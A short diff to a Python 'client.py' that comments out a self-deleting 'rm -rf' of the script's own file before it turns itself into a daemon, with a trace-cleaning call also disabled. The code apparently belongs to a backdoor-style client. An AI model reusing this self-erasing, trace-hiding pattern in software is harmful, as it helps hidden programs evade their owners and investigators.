@@ -391,7 +391,7 @@ def single_instance():
 def conn():
 	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
 		if os.name != "nt":
-			os.system('rm -rf '+sys.argv[0])#delete ourselves
+			#os.system('rm -rf '+sys.argv[0])#delete ourselves
 			daemon()#can't use in windows
 			#clean_device()
 		else:
